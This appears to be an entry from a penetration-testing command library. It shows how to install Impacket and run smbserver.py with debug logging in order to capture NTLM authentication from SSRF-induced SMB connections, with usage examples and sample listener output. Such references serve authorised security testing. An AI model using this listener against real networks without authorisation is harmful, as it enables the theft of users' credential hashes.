---
data: |-
  pip install impacket
  git clone https://github.com/SecureAuthCorp/impacket.git
  cd impacket/examples
  python3 smbserver.py SHARE /tmp/share -debug
tags:
  - smb
  - listener
type: command
output: null
executor: python
platforms:
  - Linux
  - Windows
created_at: '2024-10-04'
updated_at: '2025-12-14T03:53:38.753Z'
id: 47851f25-0853-45eb-880f-57f1ade9dbbc
verified: false
validated: true
submitted: true
---
# impacket-smbserver-setup

## Command

```bash
pip install impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/examples
python3 smbserver.py SHARE /tmp/share -debug
```

## Description

This multi-line command installs Impacket, clones the repository, and starts an SMB server named 'SHARE' backed by /tmp/share, with debug logging to capture NTLM authentication details. Use it to listen for SSRF-induced SMB connections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `SHARE` | Name of the SMB share | Yes |
| `/tmp/share` | Local directory to serve as share | Yes |
| `-debug` | Enable verbose logging for auth captures | No |

## Examples

### Basic Usage

```bash
python3 smbserver.py PUBLIC /path/to/public -debug
```

### Advanced Usage

```bash
python3 smbserver.py SHARE /tmp/share -debug -smb2support
```

## Expected Output

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID {6BFFD098-A112-3610-9833-012892020162} V:1.0
[*] Callback added for UUID {12345678-1234-ABCD-EF00-0123456789AB} V:1.0
[*] SMB Server starting...
[*] Listening on 0.0.0.0:445

Followed by connection logs like: INCOMING CONNECTION: (TARGET_IP,445) from (TARGET_IP:xxxxx)

## Related

- [[Related Procedure|procedures/Setup-Impacket-SMB-Server-for-NTLM-Capture]]
